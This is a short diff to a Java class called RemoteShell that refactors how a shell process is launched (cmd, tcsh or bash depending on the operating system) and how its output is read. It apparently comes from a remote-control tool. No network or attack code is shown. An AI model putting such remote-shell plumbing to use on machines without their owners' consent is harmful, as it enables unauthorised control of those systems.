@@ -15,13 +15,21 @@ public class RemoteShell extends Thread {
 	public void run() {
 		String line;
 		try {
+			
+			String shell;
+			
 			if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
-				p = Runtime.getRuntime().exec("cmd");
+				shell = "cmd";
+			} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.FREEBSD || OperatingSystem.getOperatingSystem() == OperatingSystem.OPENBSD || OperatingSystem.getOperatingSystem() == OperatingSystem.NETBSD) {
+				shell = "/bin/tcsh";
 			} else {
-				ProcessBuilder builder = new ProcessBuilder("/bin/bash");
-				builder.redirectErrorStream(true);
-				p = builder.start();
+				shell = "/bin/bash";
 			}
+			
+			ProcessBuilder builder = new ProcessBuilder(shell);
+			builder.redirectErrorStream(true);
+			p = builder.start();
+			
 			BufferedReader input = new BufferedReader(new InputStreamReader(p.getInputStream()));
 			while ((line = input.readLine()) != null) {
 				if (!line.trim().equals("")) {
